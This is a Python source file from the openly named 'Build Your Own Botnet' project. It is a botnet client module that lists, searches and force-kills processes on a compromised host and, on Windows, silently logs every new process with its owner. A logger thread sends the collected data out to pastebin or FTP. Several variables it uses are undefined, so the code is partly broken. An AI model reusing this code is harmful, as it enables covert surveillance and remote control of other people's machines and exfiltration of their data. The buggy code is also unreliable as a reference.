#!/usr/bin/python
"""
Build Your Own Botnet
https://github.com/colental/byob
Copyright (c) 2018 Daniel Vega-Myhre
"""
from __future__ import print_function

# standard libarary

import os
import sys
import json
import cStringIO
import threading
import collections

# modules

import util

# globals

packages  = []
platforms = ['win32','linux2','darwin']
_abort    = False
_buffer   = cStringIO.StringIO()
_workers  = {}
util.is_compatible(platforms, __name__)
util.imports(packages)

def list(*args, **kwargs):
    try:
        output  = {}
        for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
            pid = i.split()[1 if os.name is 'nt' else 0]
            exe = i.split()[0 if os.name is 'nt' else -1]
            if exe not in output:
                if len(json.dumps(output)) < 48000:
                    output.update({pid: exe})
                else:
                    break
        return json.dumps(output)
    except Exception as e:
        util.debug("{} error: {}".format(list.func_name, str(e)))


def search(arg):
    try:
        if not isinstance(arg, str) or not len(arg):
            return "usage: process search [PID/name]"
        output  = {}
        for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
            pid = i.split()[1 if os.name is 'nt' else 0]
            exe = i.split()[0 if os.name is 'nt' else -1]
            if arg in exe:
                if len(json.dumps(output)) < 48000:
                    output.update({pid: exe})
                else:
                    break
        return json.dumps(output)
    except Exception as e:
        util.debug("{} error: {}".format(search.func_name, str(e)))


def kill(arg):
    try:
        output  = {}
        for i in os.popen('tasklist' if os.name is 'nt' else 'ps').read().splitlines()[3:]:
            pid = i.split()[1 if os.name is 'nt' else 0]
            exe = i.split()[0 if os.name is 'nt' else -1]
            if str(arg).isdigit() and int(arg) == int(pid):
                try:
                    _ = os.popen('taskkill /pid %s /f' % pid if os.name is 'nt' else 'kill -9 %s' % pid).read()
                    output.update({str(arg): "killed"})
                except:
                    output.update({str(arg): "not found"})
            else:
                try:
                    _ = os.popen('taskkill /im %s /f' % exe if os.name is 'nt' else 'kill -9 %s' % exe).read()
                    output.update({str(p.name()): "killed"})
                except Exception as e:
                    util.debug(e)
            return json.dumps(output)
    except Exception as e:
        util.debug("{} error: {}".format(kill.func_name, str(e)))


@util.threaded
def monitor(arg):
    if os.name != 'nt':
        return "Error: Windows platforms only"
    try:
        import wmi
        import pythoncom
        if not len(_buffer.getvalue()):
            _buffer.write("Time, User , Executable, PID, Privileges\n")
        pythoncom.CoInitialize()
        c = wmi.WMI()
        _workers[logger.func_name] = logger()
        process_watcher = c.Win32_Process.watch_for("creation")
        while True:
            try:
                new_process = process_watcher()
                proc_owner  = new_process.GetOwner()
                proc_owner  = "%s\\%s" % (proc_owner[0],proc_owner[2])
                create_date = new_process.CreationDate
                executable  = new_process.ExecutablePath
                pid         = new_process.ProcessId
                parent_pid  = new_process.ParentProcessId
                output      = '"%s", "%s", "%s", "%s", "%s"\n' % (create_date, proc_owner, executable, pid, parent_pid)
                if not keyword:
                    _buffer.write(output)
                else:
                    if keyword in output:
                        _buffer.write(output)
            except Exception as e1:
                util.debug("{} error: {}".format(monitor.func_name, str(e1)))
            if _abort:
                break
    except Exception as e2:
        util.debug("{} error: {}".format(monitor.func_name, str(e2)))


@util.threaded
def logger(*args, **kwargs):
    try:
        while True:
            if _buffer.tell() > max_bytes:
                try:
                    result = util.pastebin(_buffer) if 'ftp' not in args else _Upload_ftp(_buffer)
                    results.append(result)
                    _buffer.reset()
                except Exception as e:
                    util.debug("{} error: {}".format(logger.func_name, str(e)))
            elif _abort:
                break
            else:
                time.sleep(5)
    except Exception as e:
        util.debug("{} error: {}".format(logger.func_name, str(e)))
